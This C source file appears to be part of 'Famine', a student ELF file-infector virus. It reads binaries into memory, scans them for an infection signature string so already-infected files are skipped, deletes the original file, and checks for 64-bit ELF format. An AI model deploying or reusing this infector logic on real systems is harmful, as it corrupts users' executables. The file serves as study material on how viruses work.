#include "woody.h"

ssize_t get_file_size(const char *file_name)
{
	struct stat stat;

	if (!(lstat(file_name, &stat) == 0))
	{
		return elf_error(E_OPEN);
	}

	return stat.st_size;
}

int copy_file(t_woody *woody, char *filename)
{
	int fd = open(filename, O_RDONLY);

	if (fd < 0)
	{
		return elf_error(E_OPEN);
	}

	if (read(fd, woody->addr, woody->filesize) != woody->filesize)
	{
		close(fd);
		// free(woody->addr);
		return elf_error(E_COPY);
	}
	char * string = woody->addr;
	for (int i = 0; i < woody->filesize; i++){
		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye", 45) != NULL){
			// printf("already crypted!");
			return ERROR_CODE;
		}
	}
	close(fd);
	remove(filename);
	return 0;
}

int check_fileformat(unsigned char *c)
{
	if (c[0] == 0x7f &&
		c[1] == 'E' &&
		c[2] == 'L' &&
		c[3] == 'F' &&
		c[4] == ELFCLASS64 &&
		(c[16] == ET_EXEC || c[16] == ET_DYN))
	{
		return 0;
	}
	else
	{
		return elf_error(E_FILE_INVALID);
	}
}

int read_elf_file(t_woody *woody, char *filename)
{
	woody->filesize = get_file_size(filename);
	if(woody->filesize == ERROR_CODE){
		return ERROR_CODE;
	}

	woody->filename = filename;
	woody->addr = malloc(woody->filesize);
	if (woody->addr == NULL)
	{
		return elf_error(E_MALLOC);
	}

	if(copy_file(woody, filename) == ERROR_CODE){
		return ERROR_CODE;
	}
	return check_fileformat(woody->addr);
}
